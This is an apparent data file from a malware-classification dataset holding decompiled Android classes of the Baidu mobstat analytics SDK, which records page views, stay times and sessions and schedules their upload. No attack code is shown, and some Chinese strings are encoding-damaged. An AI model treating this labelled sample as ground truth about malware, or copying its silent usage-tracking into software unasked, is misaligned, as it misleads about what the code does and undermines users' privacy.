"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\k.code","public class k {   private static Handler i;   private Timer e;   private WeakReference<Context> h;   private static HandlerThread a=new HandlerThread(""LogSenderThread"");   private static k j=new k();   private boolean b=false;   private SendStrategyEnum c=SendStrategyEnum.APP_START;   private int d=1;   private int f=0;   private boolean g=false;   private k(){     a.start();     i=new Handler(a.getLooper());   }   public static k a(){     return j;   }   private void e(  Context context){     if (context == null) {       com.baidu.mobstat.a.c.a(""sdkstat"",""initContext context="" + ((Object)null));     }     if (this.h != null || context == null) {       return;     }     this.h=new WeakReference<>(context);   }   public void a(  int i2){     if (i2 < 0 || i2 > 30) {       return;     }     this.f=i2;   }   public void a(  Context context){     e(context);     SendStrategyEnum sendStrategyEnum=SendStrategyEnum.APP_START;     try {       String a2=x.a(context,""BaiduMobAd_EXCEPTION_LOG"");       if (!a2.equals("""")) {         if (a2.equals(""true"")) {           i.a().a(context);           BasicStoreTools.getInstance().setExceptionTurn(context,true);         }  else         if (a2.equals(""false"")) {           BasicStoreTools.getInstance().setExceptionTurn(context,false);         }       }     }  catch (    Exception e) {       com.baidu.mobstat.a.c.a(e);     }     try {       String a3=x.a(context,""BaiduMobAd_SEND_STRATEGY"");       if (!a3.equals("""")) {         if (a3.equals(SendStrategyEnum.APP_START.name())) {           sendStrategyEnum=SendStrategyEnum.APP_START;           BasicStoreTools.getInstance().setSendStrategy(context,sendStrategyEnum.ordinal());         }  else         if (a3.equals(SendStrategyEnum.ONCE_A_DAY.name())) {           sendStrategyEnum=SendStrategyEnum.ONCE_A_DAY;           BasicStoreTools.getInstance().setSendStrategy(context,sendStrategyEnum.ordinal());           BasicStoreTools.getInstance().setSendStrategyTime(context,24);         }  else         if (a3.equals(SendStrategyEnum.SET_TIME_INTERVAL.name())) {           sendStrategyEnum=SendStrategyEnum.SET_TIME_INTERVAL;           BasicStoreTools.getInstance().setSendStrategy(context,sendStrategyEnum.ordinal());         }       }     }  catch (    Exception e2) {       com.baidu.mobstat.a.c.a(e2);       sendStrategyEnum=sendStrategyEnum;     }     try {       String a4=x.a(context,""BaiduMobAd_TIME_INTERVAL"");       if (!a4.equals("""")) {         int parseInt=Integer.parseInt(a4);         if (sendStrategyEnum.ordinal() == SendStrategyEnum.SET_TIME_INTERVAL.ordinal() && parseInt > 0 && parseInt <= 24) {           BasicStoreTools.getInstance().setSendStrategyTime(context,parseInt);         }       }     }  catch (    Exception e3) {       com.baidu.mobstat.a.c.a(e3);     }     try {       String a5=x.a(context,""BaiduMobAd_ONLY_WIFI"");       if (a5.equals("""")) {         return;       }       if (a5.equals(""true"")) {         BasicStoreTools.getInstance().setOnlyWifi(context,true);       }  else       if (a5.equals(""false"")) {         BasicStoreTools.getInstance().setOnlyWifi(context,false);       }     }  catch (    Exception e4) {       com.baidu.mobstat.a.c.a(e4);     }   }   public void a(  Context context,  SendStrategyEnum sendStrategyEnum,  int i2,  boolean z){     if (!sendStrategyEnum.equals(SendStrategyEnum.SET_TIME_INTERVAL)) {       this.c=sendStrategyEnum;       BasicStoreTools.getInstance().setSendStrategy(context,this.c.ordinal());       if (sendStrategyEnum.equals(SendStrategyEnum.ONCE_A_DAY)) {         BasicStoreTools.getInstance().setSendStrategyTime(context,24);       }     }  else     if (i2 <= 0 || i2 > 24) {       com.baidu.mobstat.a.c.c(""setSendLogStrategy"",""time_interval is invalid, new strategy does not work"");     }  else {       this.d=i2;       this.c=SendStrategyEnum.SET_TIME_INTERVAL;       BasicStoreTools.getInstance().setSendStrategy(context,this.c.ordinal());       BasicStoreTools.getInstance().setSendStrategyTime(context,this.d);     }     this.b=z;     BasicStoreTools.getInstance().setOnlyWifi(context,this.b);     com.baidu.mobstat.a.c.a(""sdkstat"",""sstype is:"" + this.c.name() + "" And time_interval is:""+ this.d+ "" And m_only_wifi:""+ this.b);   }   public void a(  Context context,  boolean z){     if (z) {       try {         if (!((WifiManager)context.getSystemService(""wifi"")).isWifiEnabled()) {           com.baidu.mobstat.a.c.a(""stat"",""sendLogData() does not send because of only_wifi setting"");           return;         }       }  catch (      Exception e) {         com.baidu.mobstat.a.c.a(""stat"",""sendLogData exception when get wifimanager"");         return;       }     }     DataCore.getInstance().sendLogData(context);   }   public void a(  boolean z,  Context context){     e(context);     this.g=z;     com.baidu.mobstat.a.c.a(""sdkstat"",""APP_ANALYSIS_EXCEPTION is:"" + this.g);     BasicStoreTools.getInstance().setExceptionTurn(context,this.g);   }   public void b(  Context context){     e(context);     if (context == null && this.h.get() != null) {       context=this.h.get();     }     i.post(new l(this,context));   }   public void c(  Context context){     BasicStoreTools.getInstance().setLastSendTime(context,new Date().getTime());   }   public void d(  Context context){     this.e=new Timer();     this.e.schedule(new n(this,context),this.d * 3600000,this.d * 3600000);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\l.code","public class l implements Runnable {   final Context a;   final k b;   public l(  k kVar,  Context context){     this.b=kVar;     this.a=context;   }   @Override public void run(){     boolean z;     Timer timer;     SendStrategyEnum sendStrategyEnum;     SendStrategyEnum sendStrategyEnum2;     Handler handler;     int i;     Timer timer2;     this.b.g=BasicStoreTools.getInstance().loadExceptionTurn(this.a);     z=this.b.g;     if (z) {       i.a().b(this.a);     }     timer=this.b.e;     if (timer != null) {       timer2=this.b.e;       timer2.cancel();       this.b.e=null;     }     this.b.c=SendStrategyEnum.values()[BasicStoreTools.getInstance().loadSendStrategy(this.a)];     this.b.d=BasicStoreTools.getInstance().loadSendStrategyTime(this.a);     this.b.b=BasicStoreTools.getInstance().loadOnlyWifiChannel(this.a);     sendStrategyEnum=this.b.c;     if (sendStrategyEnum.equals(SendStrategyEnum.SET_TIME_INTERVAL)) {       this.b.d(this.a);     }  else {       sendStrategyEnum2=this.b.c;       if (sendStrategyEnum2.equals(SendStrategyEnum.ONCE_A_DAY)) {         this.b.d(this.a);       }     }     handler=k.i;     m mVar=new m(this);     i=this.b.f;     handler.postDelayed(mVar,i * 1000);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\m.code","class m implements Runnable {   final l a;   public m(  l lVar){     this.a=lVar;   }   @Override public void run(){     boolean z;     k kVar=this.a.b;     Context context=this.a.a;     z=this.a.b.b;     kVar.a(context,z);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\n.code","public class n extends TimerTask {   final Context a;   final k b;   public n(  k kVar,  Context context){     this.b=kVar;     this.a=context;   }   @Override public void run(){     boolean z;     if (DataCore.getInstance().isPartEmpty()) {       return;     }     k kVar=this.b;     Context context=this.a;     z=this.b.b;     kVar.a(context,z);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\o.code","public class o {   private long b=0;   private long c=0;   private int d=0;   List<p> a=new ArrayList();   public o(){     a(System.currentTimeMillis());   }   public long a(){     return this.b;   }   public void a(  int i){     this.d=i;   }   public void a(  long j){     this.b=j;   }   public void a(  String str,  long j,  long j2){     this.a.add(new p(this,str,j,j2));   }   public void b(){     this.b=0L;     this.c=0L;     this.d=0;     this.a.clear();     a(System.currentTimeMillis());   }   public void b(  long j){     this.c=j;   }   public JSONObject c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""s"",this.b);       jSONObject.put(""e"",this.c);       jSONObject.put(""i"",System.currentTimeMillis());       jSONObject.put(""c"",this.d);       JSONArray jSONArray=new JSONArray();       for (int i=0; i < this.a.size(); i++) {         JSONObject jSONObject2=new JSONObject();         jSONObject2.put(""n"",this.a.get(i).a());         jSONObject2.put(""d"",this.a.get(i).b());         long c=this.a.get(i).c() - this.b;         if (c < 0) {           c=0;         }         jSONObject2.put(""ps"",c);         jSONArray.put(jSONObject2);       }       jSONObject.put(""p"",jSONArray);     }  catch (    JSONException e) {       com.baidu.mobstat.a.c.a(""stat"",""StatSession.constructJSONObject() failed"");     }     return jSONObject;   }   public int d(){     return this.d;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\p.code","class p {   final o a;   private String b;   private long c;   private long d;   public p(  o oVar,  String str,  long j,  long j2){     this.a=oVar;     this.b=str;     this.c=j;     this.d=j2;   }   public String a(){     return this.b;   }   public long b(){     return this.c;   }   public long c(){     return this.d;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\q.code","public class q {   private static Handler b;   private WeakReference<Context> g;   private WeakReference<Fragment> h;   private WeakReference<Object> i;   private static HandlerThread a=new HandlerThread(""SessionAnalysisThread"");   private static q k=new q();   private long c=0;   private long d=0;   private long e=0;   private long f=0;   private o j=new o();   private int l=-1;   private boolean m=true;   private boolean n=false;   private boolean o=false;   private boolean p=false;   private boolean q=false;   private String r=null;   private q(){     a.start();     a.setPriority(10);     b=new Handler(a.getLooper());   }   public static Context a(  Object obj){     try {       return (Context)obj.getClass().getMethod(""getActivity"",new Class[0]).invoke(obj,new Object[0]);     }  catch (    Throwable th) {       com.baidu.mobstat.a.c.a(th.getMessage());       return null;     }   }   public void a(  Context context){     if (context == null) {       com.baidu.mobstat.a.c.a(""stat"",""clearLastSession(Context context):context=null"");     }  else {       com.baidu.mobstat.a.b.a(false,context,""__local_last_session.json"",""{}"",false);     }   }   private void a(  boolean z){     this.m=z;   }   public static q b(){     return k;   }   public void c(  Context context,  long j){     com.baidu.mobstat.a.c.a(""stat"",""flush current session to last_session.json"");     new JSONObject();     JSONObject c=this.j.c();     try {       c.put(""e"",j);     }  catch (    JSONException e) {       com.baidu.mobstat.a.c.a(""stat"",""StatSession.flushSession() failed"");     }     String jSONObject=c.toString();     com.baidu.mobstat.a.c.a(""stat"",""cacheString="" + jSONObject);     com.baidu.mobstat.a.b.a(false,context,""__local_last_session.json"",jSONObject,false);   }   private boolean e(){     return this.m;   }   public int a(){     if (this.l == -1) {       this.l=30000;     }     return this.l;   }   public void a(  int i){     this.l=i * 1000;   }   public void a(  Context context,  long j){     com.baidu.mobstat.a.c.a(""stat"",""AnalysisResume job"");     if (this.n) {       com.baidu.mobstat.a.c.c(""stat"",""é�—æ¼�StatService.onPause() || missing StatService.onPause()"");     }     this.n=true;     if (e()) {       com.baidu.mobstat.a.c.a(""is_first_resume=true"");       a(false);       b.post(new r(this));     }  else {       com.baidu.mobstat.a.c.a(""stat"","" is_first_resume=false"");     }     b.post(new w(this,this.c,j,context,null,null,1));     this.g=new WeakReference<>(context);     this.d=j;   }   public void a(  Context context,  long j,  String str){     com.baidu.mobstat.a.c.a(""stat"",""AnalysisPageStart"");     if (this.q) {       com.baidu.mobstat.a.c.c(""stat"",""é�—æ¼�StatService.onPageEnd() || missing StatService.onPageEnd()"");     }     this.q=true;     if (e()) {       com.baidu.mobstat.a.c.b(""PPPPPPPPPPPPP is_first_resume=true"");       a(false);       b.post(new s(this));     }  else {       com.baidu.mobstat.a.c.a(""stat"","" is_first_resume=false"");     }     b.post(new w(this,this.c,j,context,null,null,1));     this.r=str;     this.g=new WeakReference<>(context);     this.d=j;   }   public void a(  Fragment fragment,  long j){     com.baidu.mobstat.a.c.a(""stat"",""post resume job"");     if (this.o) {       com.baidu.mobstat.a.c.c(""stat"",""é�—æ¼�StatService.onPause() || missing StatService.onPause()"");     }     this.o=true;     if (e()) {       com.baidu.mobstat.a.c.a(""stat"",""is_first_resume=true"");       a(false);       b.post(new t(this));     }  else {       com.baidu.mobstat.a.c.a(""stat"",""is_first_resume=false"");     }     b.post(new w(this,this.c,j,null,fragment,null,2));     this.h=new WeakReference<>(fragment);     this.e=j;   }   public void a(  Object obj,  long j){     com.baidu.mobstat.a.c.a(""stat"",""post resume job"");     if (this.p) {       com.baidu.mobstat.a.c.c(""stat"",""é�—æ¼�StatService.onPause() || missing StatService.onPause()"");     }     this.p=true;     if (e()) {       com.baidu.mobstat.a.c.a(""stat"",""is_first_resume=true"");       a(false);       b.post(new u(this));     }  else {       com.baidu.mobstat.a.c.a(""stat"",""is_first_resume=false"");     }     b.post(new w(this,this.c,j,null,null,obj,3));     this.i=new WeakReference<>(obj);     this.f=j;   }   public void b(  Context context,  long j){     com.baidu.mobstat.a.c.a(""stat"",""post pause job"");     if (!this.n) {       com.baidu.mobstat.a.c.c(""stat"",""é�—æ¼�StatService.onResume() || missing StatService.onResume()"");       return;     }     this.n=false;     b.post(new v(this,j,context,null,this.d,this.g.get(),null,1,null,null,null));     this.c=j;   }   public void b(  Context context,  long j,  String str){     com.baidu.mobstat.a.c.a(""stat"",""post pause job"");     if (!this.q) {       com.baidu.mobstat.a.c.c(""stat"",""Please check (1)é�—æ¼�StatService.onPageStart() || missing StatService.onPageStart()"");       return;     }     this.q=false;     if (this.r == null || !this.r.equals(str)) {       com.baidu.mobstat.a.c.c(""stat"",""Please check the reason : (1)é�—æ¼�StatService.onPageStart() || missing StatService.onPageStart() || (2)é¡µé�¢çš„èµ·å§‹å’Œç»“æ�Ÿä¸�æ˜¯å�Œä¸€é¡µé�¢ || The page "" + str + "" name is not equal to the page end ""+ this.r+ """");     }  else {       b.post(new v(this,j,context,null,this.d,this.g.get(),null,1,str,null,null));       this.c=j;     }   }   public void b(  Fragment fragment,  long j){     com.baidu.mobstat.a.c.a(""stat"",""post pause job"");     if (!this.o) {       com.baidu.mobstat.a.c.c(""stat"",""é�—æ¼�android.support.v4.app.Fragment StatService.onResume() || android.support.v4.app.Fragment missing StatService.onResume()"");       return;     }     this.o=false;     b.post(new v(this,j,null,fragment,this.e,null,this.h.get(),2,null,null,null));     this.c=j;   }   public void b(  Object obj,  long j){     com.baidu.mobstat.a.c.a(""stat"",""post pause job"");     if (!this.p) {       com.baidu.mobstat.a.c.c(""stat"",""é�—æ¼�android.app.Fragment StatService.onResume() || android.app.Fragment missing StatService.onResume()"");       return;     }     this.p=false;     b.post(new v(this,j,null,null,this.f,null,null,3,null,this.i.get(),obj));     this.c=j;   }   public void c(){     this.j.a(this.j.d() + 1);   }   public long d(){     return this.j.a();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\r.code","public class r implements Runnable {   final q a;   public r(  q qVar){     this.a=qVar;   }   @Override public void run(){     if (j.a().c()) {       return;     } synchronized (j.a()) {       try {         j.a().wait();       }  catch (      InterruptedException e) {         com.baidu.mobstat.a.c.a(""stat"",e);       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\s.code","public class s implements Runnable {   final q a;   public s(  q qVar){     this.a=qVar;   }   @Override public void run(){     if (j.a().c()) {       return;     } synchronized (j.a()) {       try {         j.a().wait();       }  catch (      InterruptedException e) {         com.baidu.mobstat.a.c.a(""stat"",e);       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\StatActivity.code","public class StatActivity extends Activity {   @Override public void onPause(){     super.onPause();     com.baidu.mobstat.a.c.a(""stat"",""StatActivity.OnResume()"");     StatService.onPause((Context)this);   }   @Override public void onResume(){     super.onResume();     com.baidu.mobstat.a.c.a(""stat"",""StatActivity.OnResume()"");     StatService.onResume((Context)this);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\StatFragment.code","public class StatFragment extends Fragment {   @Override public void onPause(){     super.onPause();     com.baidu.mobstat.a.c.a(""stat"",""StatFragment.OnResume()"");     StatService.onPause((Fragment)this);   }   @Override public void onResume(){     super.onResume();     com.baidu.mobstat.a.c.a(""stat"",""StatFragment.OnResume()"");     StatService.onResume((Fragment)this);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\StatService.code","public class StatService {   public static final int EXCEPTION_LOG=1;   private static boolean a=false;   private static void a(  Context context){     if (a(context,""onError(...)"")) {       i.a().a(context.getApplicationContext());       k.a().a(true,context.getApplicationContext());     }   }   private static boolean a(){     return a;   }   private static boolean a(  Context context,  String str){     if (context != null) {       return true;     }     com.baidu.mobstat.a.c.c(""stat"",str + "":context=null"");     return false;   }   private static boolean a(  Class<?> cls,  String str){     boolean z=false;     StackTraceElement[] stackTrace=new Throwable().getStackTrace();     com.baidu.mobstat.a.c.a(""isCalledBy"",Integer.valueOf(stackTrace.length),cls,str);     if (stackTrace.length >= 2) {       for (int i=2; i < stackTrace.length; i++) {         StackTraceElement stackTraceElement=stackTrace[i];         if (stackTraceElement.getMethodName().equals(str)) {           try {             Class<?> cls2=Class.forName(stackTraceElement.getClassName());             com.baidu.mobstat.a.c.a(""isCalledBy"",cls2);             while (cls2.getSuperclass() != null && cls2.getSuperclass() != cls) {               cls2=cls2.getSuperclass();               com.baidu.mobstat.a.c.a(""isCalledBy"",cls2);             }             z=true;           }  catch (          Exception e) {             com.baidu.mobstat.a.c.a(e);           }         }       }     }     return z;   }   private static void b(){     a=true;   }   private static void b(  Context context){     if (j.a().b()) {       return;     }     j.a().a(context.getApplicationContext());   }   public static void onEvent(  Context context,  String str,  String str2){     onEvent(context,str,str2,1);   }   public static void onEvent(  Context context,  String str,  String str2,  int i){     if (!a(context,""onEvent(...)"") || str == null || str.equals("""")) {       return;     }     b(context);     c.a().a(context.getApplicationContext(),str,str2,i,System.currentTimeMillis());   }   public static void onEventDuration(  Context context,  String str,  String str2,  long j){     if (!a(context,""onEventDuration(...)"") || str == null || str.equals("""")) {       return;     }     if (j <= 0) {       com.baidu.mobstat.a.c.b(""stat"",""onEventDuration: duration must be greater than zero"");     }  else {       b(context);       c.a().c(context.getApplicationContext(),str,str2,j);     }   }   public static void onEventEnd(  Context context,  String str,  String str2){     if (!a(context,""onEventEnd(...)"") || str == null || str.equals("""")) {       return;     }     b(context);     c.a().b(context.getApplicationContext(),str,str2,System.currentTimeMillis());   }   public static void onEventStart(  Context context,  String str,  String str2){     if (!a(context,""onEventStart(...)"") || str == null || str.equals("""")) {       return;     }     b(context);     c.a().a(context.getApplicationContext(),str,str2,System.currentTimeMillis());   }   public static synchronized void onPageEnd(  Context context,  String str){ synchronized (StatService.class) {       if (context != null && str != null) {         if (!str.equals("""")) {           q.b().b(context,System.currentTimeMillis(),str);         }       }       com.baidu.mobstat.a.c.c(""stat"",""onPageEnd :parame=null || empty"");     }   }   public static synchronized void onPageStart(  Context context,  String str){ synchronized (StatService.class) {       if (context != null && str != null) {         if (!str.equals("""")) {           b(context);           q.b().a(context,System.currentTimeMillis(),str);         }       }       com.baidu.mobstat.a.c.c(""stat"",""onPageStart :parame=null || empty"");     }   }   public static synchronized void onPause(  Context context){ synchronized (StatService.class) {       if (a(context,""onPause(...)"")) {         if (!a((Class<?>)Activity.class,""onPause"")) {           throw new SecurityException(""onPause(Context context)ä¸�åœ¨Activity.onPause()ä¸­è¢«è°ƒç”¨||onPause(Context context)is not called in Activity.onPause()."");         }         q.b().b(context,System.currentTimeMillis());       }     }   }   public static synchronized void onPause(  Fragment fragment){ synchronized (StatService.class) {       if (fragment == null) {         com.baidu.mobstat.a.c.c(""stat"",""onResume :parame=null"");       }  else {         if (!a((Class<?>)Fragment.class,""onPause"")) {           throw new SecurityException(""Fragment onPause(Context context)ä¸�åœ¨Fragment.onPause()ä¸­è¢«è°ƒç”¨||onPause(Context context)is not called in Fragment.onPause()."");         }         q.b().b(fragment,System.currentTimeMillis());       }     }   }   public static synchronized void onPause(  Object obj){ synchronized (StatService.class) {       if (obj == null) {         com.baidu.mobstat.a.c.c(""stat"",""android.app.Fragment onResume :parame=null"");       }  else {         if (!a(obj.getClass(),""onPause"")) {           throw new SecurityException(""android.app.Fragment onPause(Context context)ä¸�åœ¨android.app.Fragment.onPause()ä¸­è¢«è°ƒç”¨||onPause(Context context)is not called in android.app.Fragment.onPause()."");         }         q.b().b(obj,System.currentTimeMillis());       }     }   }   public static synchronized void onResume(  Context context){ synchronized (StatService.class) {       if (a(context,""onResume(...)"")) {         if (!a((Class<?>)Activity.class,""onResume"")) {           throw new SecurityException(""onResume(Context context)ä¸�åœ¨Activity.onResume()ä¸­è¢«è°ƒç”¨||onResume(Context context)is not called in Activity.onResume()."");         }         b(context);         q.b().a(context,System.currentTimeMillis());       }     }   }   public static synchronized void onResume(  Fragment fragment){ synchronized (StatService.class) {       if (fragment == null) {         com.baidu.mobstat.a.c.c(""stat"",""onResume :parame=null"");       }  else {         if (!a((Class<?>)Fragment.class,""onResume"")) {           throw new SecurityException(""onResume(Context context)ä¸�åœ¨Activity.onResume()ä¸­è¢«è°ƒç”¨||onResume(Context context)is not called in Activity.onResume()."");         }         b(fragment.getActivity());         q.b().a(fragment,System.currentTimeMillis());       }     }   }   public static synchronized void onResume(  Object obj){ synchronized (StatService.class) {       if (obj == null) {         com.baidu.mobstat.a.c.c(""stat"",""onResume :parame=null"");       }  else {         if (!a(obj.getClass(),""onResume"")) {           throw new SecurityException(""onResume(Context context)ä¸�åœ¨Activity.onResume()ä¸­è¢«è°ƒç”¨||onResume(Context context)is not called in Activity.onResume()."");         }         b(q.a(obj));         q.b().a(obj,System.currentTimeMillis());       }     }   }   public static void setAppChannel(  Context context,  String str,  boolean z){     DataCore.getInstance().setAppChannel(context,str,z);   }   public static void setAppChannel(  String str){     DataCore.getInstance().setAppChannel(str);   }   public static void setAppKey(  String str){     DataCore.getInstance().setAppKey(str);   }   public static void setDebugOn(  boolean z){     if (z) {       com.baidu.mobstat.a.a.a=2;     }  else {       com.baidu.mobstat.a.a.a=7;     }   }   public static void setLogSenderDelayed(  int i){     k.a().a(i);   }   public static void setOn(  Context context,  int i){     if (a(context,""setOn(...)"")) {       if (!a((Class<?>)Activity.class,""onCreate"")) {         throw new SecurityException(""setOn()æ²¡æœ‰åœ¨Activity.onCreate()å†…è¢«è°ƒç”¨||setOn()is not called in Activity.onCreate()."");       }       if (a()) {         return;       }       b();       if ((i & 1) != 0) {         a(context);       }     }   }   public static void setSendLogStrategy(  Context context,  SendStrategyEnum sendStrategyEnum,  int i){     setSendLogStrategy(context,sendStrategyEnum,i,false);   }   public static void setSendLogStrategy(  Context context,  SendStrategyEnum sendStrategyEnum,  int i,  boolean z){     if (a(context,""setSendLogStrategy(...)"")) {       b(context);       k.a().a(context.getApplicationContext(),sendStrategyEnum,i,z);     }   }   public static void setSessionTimeOut(  int i){     if (i <= 0) {       com.baidu.mobstat.a.c.b(""SessionTimeOut is between 1 and 600. Default value[30] is used"");     }  else     if (i <= 600) {       q.b().a(i);     }  else {       com.baidu.mobstat.a.c.b(""SessionTimeOut is between 1 and 600. Value[600] is used"");       q.b().a(i);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\t.code","public class t implements Runnable {   final q a;   public t(  q qVar){     this.a=qVar;   }   @Override public void run(){     if (j.a().c()) {       return;     } synchronized (j.a()) {       try {         j.a().wait();       }  catch (      InterruptedException e) {         com.baidu.mobstat.a.c.a(""stat"",e);       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\u.code","public class u implements Runnable {   final q a;   public u(  q qVar){     this.a=qVar;   }   @Override public void run(){     if (j.a().c()) {       return;     } synchronized (j.a()) {       try {         j.a().wait();       }  catch (      InterruptedException e) {         com.baidu.mobstat.a.c.a(""stat"",e);       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\v.code","public class v implements Runnable {   final q a;   private long b;   private WeakReference<Context> c;   private WeakReference<Fragment> d;   private WeakReference<Object> e;   private long f;   private WeakReference<Context> g;   private WeakReference<Fragment> h;   private WeakReference<Object> i;   private int j;   private String k;   public v(  q qVar,  long j,  Context context,  Fragment fragment,  long j2,  Context context2,  Fragment fragment2,  int i,  String str,  Object obj,  Object obj2){     this.a=qVar;     this.k=null;     this.b=j;     if (context != null) {       this.c=new WeakReference<>(context);     }     this.f=j2;     if (context2 != null) {       this.g=new WeakReference<>(context2);     }     if (fragment != null) {       this.d=new WeakReference<>(fragment);     }     if (fragment2 != null) {       this.h=new WeakReference<>(fragment2);     }     if (obj != null) {       this.i=new WeakReference<>(obj);     }     if (obj2 != null) {       this.e=new WeakReference<>(obj2);     }     this.j=i;     this.k=str;   }   @Override public void run(){     o oVar;     o oVar2;     o oVar3;     if (this.j == 1) {       if (this.c.get() != this.g.get()) {         if (this.k != null) {           com.baidu.mobstat.a.c.c(""stat"",""onPageStart() æˆ– onPageEnd()å®‰æ”¾é”™è¯¯  || onPageStart() or onPageEnd() install error."");           return;         }  else {           com.baidu.mobstat.a.c.c(""stat"",""onPause() æˆ– onResume()å®‰æ”¾é”™è¯¯  ||  onPause() or onResume() install error."");           return;         }       }       long j=this.b - this.f;       Activity activity=(Activity)this.c.get();       if (activity == null) {         com.baidu.mobstat.a.c.c(""stat"",""onPause,WeakReference is already been released"");         return;       }       StringBuilder sb=new StringBuilder();       if (this.k != null) {         sb.append(this.k);       }  else {         sb.append(activity.getComponentName().getShortClassName());         if (sb.charAt(0) == '.') {           sb.deleteCharAt(0);         }       }       com.baidu.mobstat.a.c.a(""stat"",""new page view, page name = "" + sb.toString() + "",stay time = ""+ j+ ""(ms)"");       oVar3=this.a.j;       oVar3.a(sb.toString(),j,this.f);       this.a.c(this.c.get(),this.b);       return;     }     if (this.j == 2) {       if (this.d.get() != this.h.get()) {         com.baidu.mobstat.a.c.c(""stat"","" Fragment onPause() æˆ– onResume()å®‰æ”¾é”™è¯¯||onPause() or onResume() install error."");         return;       }       long j2=this.b - this.f;       Fragment fragment=this.d.get();       if (fragment == null) {         com.baidu.mobstat.a.c.c(""stat"",""onPause,WeakReference is already been released"");         return;       }       String str=fragment.getClass().getName().toString();       String substring=str.substring(str.lastIndexOf(""."") + 1);       com.baidu.mobstat.a.c.a(""stat"",""Fragment new page view, page name = "" + str.toString() + "",stay time = ""+ j2+ ""(ms)"");       oVar2=this.a.j;       oVar2.a(substring,j2,this.f);       this.a.c(this.d.get().getActivity(),this.b);       return;     }     if (this.j == 3) {       if (this.e.get() != this.i.get()) {         com.baidu.mobstat.a.c.c(""stat"","" Fragment onPause() æˆ– onResume()å®‰æ”¾é”™è¯¯||onPause() or onResume() install error."");         return;       }       long j3=this.b - this.f;       Object obj=this.e.get();       if (obj == null) {         com.baidu.mobstat.a.c.c(""stat"",""onPause,WeakReference is already been released"");         return;       }       Context a=q.a(obj);       String str2=obj.getClass().getName().toString();       String substring2=str2.substring(str2.lastIndexOf(""."") + 1);       com.baidu.mobstat.a.c.a(""stat"",""android.app.Fragment new page view, page name = "" + str2.toString() + "",stay time = ""+ j3+ ""(ms)"");       oVar=this.a.j;       oVar.a(substring2,j3,this.f);       this.a.c(a,this.b);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\w.code","public class w implements Runnable {   final q a;   private long b;   private long c;   private WeakReference<Context> d;   private WeakReference<Fragment> e;   private WeakReference<Object> f;   private int g;   public w(  q qVar,  long j,  long j2,  Context context,  Fragment fragment,  Object obj,  int i){     this.a=qVar;     this.g=1;     this.b=j;     this.c=j2;     this.d=new WeakReference<>(context);     this.e=new WeakReference<>(fragment);     this.f=new WeakReference<>(obj);     this.g=i;   }   @Override public void run(){     o oVar;     o oVar2;     o oVar3;     if (this.c - this.b < this.a.a() || this.b <= 0) {       return;     }     if (this.d.get() == null && this.e.get() == null && this.f.get() == null) {       return;     }     oVar=this.a.j;     oVar.b(this.b);     oVar2=this.a.j;     String jSONObject=oVar2.c().toString();     com.baidu.mobstat.a.c.a(""stat"",""new session:"" + jSONObject);     DataCore.getInstance().putSession(jSONObject);     Context context=null;     if (this.g == 1) {       Context context2=this.d.get();       DataCore.getInstance().flush(context2);       context=context2;     }  else     if (this.g == 2) {       DataCore.getInstance().flush(this.e.get().getActivity());     }  else     if (this.g == 3) {       Context a=q.a(this.f.get());       DataCore.getInstance().flush(a);       context=a;     }     oVar3=this.a.j;     oVar3.b();     if (this.g == 1) {       this.a.a(this.d.get());     }  else     if (this.g == 2) {       this.a.a((Context)this.e.get().getActivity());     }  else {       this.a.a(context);     }     k.a().b(context);   } } "
